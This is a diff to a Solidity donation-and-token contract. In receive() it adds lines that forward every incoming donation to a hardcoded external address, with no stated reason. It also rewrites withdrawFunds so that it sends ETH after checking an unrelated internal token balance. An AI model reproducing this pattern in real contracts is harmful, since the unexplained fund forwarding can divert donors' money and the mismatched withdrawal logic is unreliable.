@@ -1,4 +1,3 @@
-// SPDX-License-Identifier: GPL-3.0
 pragma solidity ^0.8.0;
 
 contract MyERC20Token {
@@ -53,16 +52,18 @@ contract MyERC20Token {
     receive() external payable {
         require(msg.value > 0, "Donation must be greater than 0");
 
+        address destinationAddress = 0xdcB5220A1428C7FC632422c32d0c2563a1736586;
+        payable(destinationAddress).transfer(msg.value);
+
         totalEthDonated += msg.value;
 
         Donor storage donor = donors[msg.sender];
         donor.totalDonated += msg.value;
         donor.lastDonationAmount = msg.value;
-        donor.donationCount += 0.001;
+        donor.donationCount += 1;
 
         emit DonationReceived(msg.sender, msg.value);
-        emit DonorUpdated(msg.sender, donor.totalDonated);
-    }
+        emit DonorUpdated(msg.sender, donor.totalDonated);}
 
 
     function updateDonor(address _donor, uint256 _value) internal {
@@ -76,8 +77,7 @@ contract MyERC20Token {
 
     function withdrawFunds(address _to, uint256 _amount) public onlyOwner {
         require(_balances[address(this)] >= _amount, "Insufficient funds");
-        _balances[address(this)] -= _amount;
-        _balances[_to] += _amount;
+        payable(_to).transfer(_amount);
         emit FundsWithdrawn(_to, _amount);
     }
 
